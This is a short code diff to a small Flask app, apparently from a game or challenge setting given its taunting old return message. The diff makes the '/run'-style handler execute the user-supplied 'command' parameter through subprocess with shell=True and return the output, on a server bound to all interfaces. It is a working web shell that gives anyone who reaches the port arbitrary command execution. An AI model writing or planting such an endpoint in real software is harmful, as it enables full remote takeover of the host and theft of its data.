@@ -1,3 +1,4 @@
+import subprocess
 from flask import Flask, request
 
 app = Flask(__name__)
@@ -6,6 +7,6 @@ app = Flask(__name__)
 def run():
     command = request.values.get("command")
     print command
-    return "game over.<br/> come again tomorrow, I'll be prepared."
+    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
 
 app.run(host="0.0.0.0", port=8000)
